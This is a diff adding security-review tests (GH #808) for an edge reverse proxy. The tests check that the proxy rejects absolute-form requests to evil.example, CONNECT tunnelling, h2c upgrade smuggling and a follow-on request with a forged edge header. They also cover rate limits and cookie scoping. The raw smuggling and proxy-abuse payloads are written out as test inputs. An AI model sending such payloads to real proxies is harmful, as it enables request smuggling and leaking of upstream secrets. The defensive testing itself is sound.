@@ -7,6 +7,8 @@ import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { ActivityBuffer, createEdgeServer, slugOf, upstreamHeaders } from "../edge/proxy.js";
 import type { EdgeRoute, RouteLookup } from "../edge/routes.js";
 import { createLogger } from "../logger.js";
+import { validateNewSlug } from "../railway/slug.js";
+import { Socket } from "node:net";
 import { Secret } from "../secret.js";
 
 const SECRET = "edge-secret-fake-0123456789abcdef0123456789abcdef";
@@ -18,6 +20,9 @@ let upstreamHost = "";
 let edge: http.Server;
 let edgePort = 0;
 const seenUpgrades: Array<Record<string, unknown>> = [];
+const upstreamRequests: string[] = [];
+const smuggled: string[] = [];
+const releaseSlow: Array<() => void> = [];
 const activity: string[] = [];
 const resumes: string[] = [];
 const routes = new Map<string, EdgeRoute>();
@@ -38,6 +43,17 @@ function route(slug: string, state: string, host: string | null = upstreamHost):
 
 beforeAll(async () => {
   upstream = http.createServer((req, res) => {
+    upstreamRequests.push(`${req.method} ${req.url}`);
+    if (req.url === "/slow") {
+      releaseSlow.push(() => res.end("slow done"));
+      return;
+    }
+    if (req.url === "/hang") return; // never answers
+    if (req.url === "/cookie") {
+      res.writeHead(200, { "set-cookie": ["a=1; Domain=agentdash.cloud; Path=/; HttpOnly", "b=2; path=/; domain=.agentdash.cloud; Secure", "c=3; Path=/"] });
+      res.end("ok");
+      return;
+    }
     if (req.url === "/stream") {
       res.writeHead(200, { "content-type": "text/plain" });
       res.write("first\n");
@@ -53,6 +69,12 @@ beforeAll(async () => {
   });
   upstream.on("upgrade", (req, socket) => {
     seenUpgrades.push({ ...req.headers, url: req.url });
+    if (req.url === "/refuse-ws") {
+      // The worst case: a box that refuses the upgrade but keeps reading the connection.
+      socket.write("HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n");
+      socket.on("data", (d) => smuggled.push(d.toString()));
+      return;
+    }
     socket.write("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n");
     socket.on("data", (d) => socket.write(`echo:${d.toString()}`));
   });
@@ -256,5 +278,184 @@ describe("activity", () => {
     expect(await buf.flush()).toBe(2);
     expect(writes).toEqual([["a", "b"]]);
     expect(await buf.flush()).toBe(0);
+  });
+});
+
+/** Raw bytes to the edge; resolves with everything read until the edge closes (or a timeout). */
+function raw(port: number, bytes: string[], waitMs = 800): Promise<{ text: string; closed: boolean }> {
+  return new Promise((resolve) => {
+    const sock = new Socket();
+    let text = "";
+    let closed = false;
+    const done = () => resolve({ text, closed });
+    const t = setTimeout(() => {
+      sock.destroy();
+      done();
+    }, waitMs);
+    sock.on("data", (d) => (text += d.toString()));
+    sock.on("close", () => {
+      closed = true;
+      clearTimeout(t);
+      done();
+    });
+    sock.on("error", () => {});
+    sock.connect(port, "127.0.0.1", () => {
+      for (const b of bytes) sock.write(b);
+    });
+  });
+}
+
+async function startEdge(extra: Partial<Parameters<typeof createEdgeServer>[0]>) {
+  const server = createEdgeServer({ routes: lookup, edgeDomain: "agentdash.cloud", log, clientIpSource: "x-real-ip", upstreamProtocol: "http", ...extra });
+  track(server);
+  await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
+  return { server, port: (server.address() as AddressInfo).port };
+}
+
+async function stopEdge(server: http.Server) {
+  server.closeAllConnections();
+  await new Promise<void>((r) => server.close(() => r()));
+}
+
+describe("security review (GH #808)", () => {
+  it("HIGH 1: refuses an absolute-form request target and never forwards it with the edge secret", async () => {
+    route("acme", "active");
+    const before = upstreamRequests.length;
+    const r = await raw(edgePort, ["GET http://evil.example/steal HTTP/1.1\r\nHost: acme.agentdash.cloud\r\nConnection: close\r\n\r\n"]);
+    expect(r.text).toMatch(/^HTTP\/1\.1 400/);
+    const auth = await raw(edgePort, ["CONNECT evil.example:443 HTTP/1.1\r\nHost: acme.agentdash.cloud\r\n\r\n"]);
+    expect(auth.text).not.toMatch(/^HTTP\/1\.1 200/);
+    expect(upstreamRequests.slice(before)).toEqual([]);
+    // OPTIONS * is the one non-path target allowed.
+    const star = await raw(edgePort, ["OPTIONS * HTTP/1.1\r\nHost: acme.agentdash.cloud\r\nConnection: close\r\n\r\n"]);
+    expect(star.text).toMatch(/^HTTP\/1\.1 201/);
+    expect(upstreamRequests.at(-1)).toBe("OPTIONS *");
+  });
+
+  it("HIGH 2: refuses a non-websocket upgrade (h2c) and closes, with nothing reaching the box", async () => {
+    route("acme", "active");
+    const beforeUp = seenUpgrades.length;
+    const beforeReq = upstreamRequests.length;
+    const r = await raw(edgePort, [
+      "GET / HTTP/1.1\r\nHost: acme.agentdash.cloud\r\nConnection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n",
+      "GET /steal HTTP/1.1\r\nHost: other.example\r\nX-AgentDash-Edge: forged\r\n\r\n",
+    ]);
+    expect(r.text).toMatch(/^HTTP\/1\.1 400/);
+    expect(r.closed).toBe(true);
+    expect(seenUpgrades.length).toBe(beforeUp);
+    expect(upstreamRequests.slice(beforeReq)).toEqual([]);
+  });
+
+  it("HIGH 2: when the box refuses a websocket upgrade, the refusal is relayed and nothing more is piped", async () => {
+    route("acme", "active");
+    smuggled.length = 0;
+    const r = await raw(edgePort, [
+      "GET /refuse-ws HTTP/1.1\r\nHost: acme.agentdash.cloud\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\n",
+      "GET /steal HTTP/1.1\r\nHost: other.example\r\nX-AgentDash-Edge: forged\r\n\r\n",
+    ]);
+    expect(r.text).toMatch(/^HTTP\/1\.1 403/);
+    expect(r.closed).toBe(true);
+    await new Promise((res) => setTimeout(res, 200));
+    expect(smuggled).toEqual([]);
+    // Only Connection and Upgrade survive as hop-by-hop headers on the upgrade.
+    const seen = seenUpgrades.at(-1)!;
+    expect(seen).toMatchObject({ connection: "Upgrade", upgrade: "websocket" });
+  });
+
+  it("MEDIUM 3: caps concurrent requests per client IP and the request body size; times out an idle upstream", async () => {
+    route("acme", "active");
+    const { server, port } = await startEdge({ limits: { maxPerClient: 2, maxBodyBytes: 1000, upstreamIdleMs: 300 } });
+    try {
+      const req = (ip: string, path: string) =>
+        new Promise<number>((resolve) => {
+          const r = http.request({ host: "127.0.0.1", port, path, headers: { host: "acme.agentdash.cloud", "x-real-ip": ip } }, (res) => {
+            res.resume();
+            res.on("end", () => resolve(res.statusCode ?? 0));
+          });
+          r.on("error", () => resolve(0));
+          r.end();
+        });
+      releaseSlow.length = 0;
+      const a = req("203.0.113.50", "/slow");
+      const b = req("203.0.113.50", "/slow");
+      await new Promise((res) => setTimeout(res, 100));
+      expect(await req("203.0.113.50", "/x")).toBe(429);
+      expect(await req("203.0.113.51", "/x")).toBe(201);
+      releaseSlow.forEach((f) => f());
+      expect([await a, await b]).toEqual([200, 200]);
+      expect(await req("203.0.113.50", "/x")).toBe(201); // released
+
+      const big = await new Promise<number>((resolve) => {
+        const r = http.request({ host: "127.0.0.1", port, path: "/upload", method: "POST", headers: { host: "acme.agentdash.cloud", "content-length": "5000" } }, (res) => {
+          res.resume();
+          resolve(res.statusCode ?? 0);
+        });
+        r.on("error", () => resolve(0));
+        r.end("x".repeat(5000));
+      });
+      expect(big).toBe(413);
+      const chunked = await new Promise<number>((resolve) => {
+        const r = http.request({ host: "127.0.0.1", port, path: "/upload", method: "POST", headers: { host: "acme.agentdash.cloud", "transfer-encoding": "chunked" } }, (res) => {
+          res.resume();
+          resolve(res.statusCode ?? 0);
+        });
+        r.on("error", () => resolve(0));
+        for (let i = 0; i < 10; i++) r.write("y".repeat(500));
+        r.end();
+      });
+      expect([0, 413]).toContain(chunked);
+
+      const started = Date.now();
+      expect(await req("203.0.113.52", "/hang")).toBe(502);
+      expect(Date.now() - started).toBeLessThan(3000);
+      expect(server.headersTimeout).toBeGreaterThan(0);
+      expect(server.requestTimeout).toBeGreaterThan(0);
+    } finally {
+      await stopEdge(server);
+    }
+  });
+
+  it("MEDIUM 4: makes every cookie a box sets host-only", async () => {
+    route("acme", "active");
+    const res = await get("acme.agentdash.cloud", "/cookie");
+    const cookies = [res.headers["set-cookie"] ?? []].flat();
+    expect(cookies).toHaveLength(3);
+    for (const c of cookies) expect(c.toLowerCase()).not.toContain("domain=");
+    expect(cookies[0]).toContain("a=1");
+    expect(cookies[0]).toContain("HttpOnly");
+  });
+
+  it("LOW 5: stops proxying on a stale route table, ignores X-Real-IP from the private network, reserves xn--", async () => {
+    route("acme", "active");
+    const stale = await startEdge({ routeAgeMs: () => 10 * 60_000 });
+    try {
+      const r = await new Promise<{ status: number; body: string }>((resolve) => {
+        http.get({ host: "127.0.0.1", port: stale.port, path: "/", headers: { host: "acme.agentdash.cloud" } }, (res) => {
+          let body = "";
+          res.on("data", (c) => (body += c));
+          res.on("end", () => resolve({ status: res.statusCode ?? 0, body }));
+        });
+      });
+      expect(r.status).toBe(503);
+      expect(r.body).toContain("Temporarily unavailable");
+    } finally {
+      await stopEdge(stale.server);
+    }
+    const priv = await startEdge({ privateNetworkCidrs: ["127.0.0.0/8"] });
+    try {
+      const echo = await new Promise<Record<string, string>>((resolve) => {
+        http.get({ host: "127.0.0.1", port: priv.port, path: "/x", headers: { host: "acme.agentdash.cloud", "x-real-ip": "198.51.100.9" } }, (res) => {
+          let body = "";
+          res.on("data", (c) => (body += c));
+          res.on("end", () => resolve((JSON.parse(body) as { headers: Record<string, string> }).headers));
+        });
+      });
+      expect(echo["x-agentdash-client-ip"]).toBe("127.0.0.1");
+    } finally {
+      await stopEdge(priv.server);
+    }
+    route("xn--80ak6aa92e", "active");
+    expect((await get("xn--80ak6aa92e.agentdash.cloud", "/")).status).toBe(404);
+    expect(() => validateNewSlug("xn--acme")).toThrow(/reserved/);
   });
 });
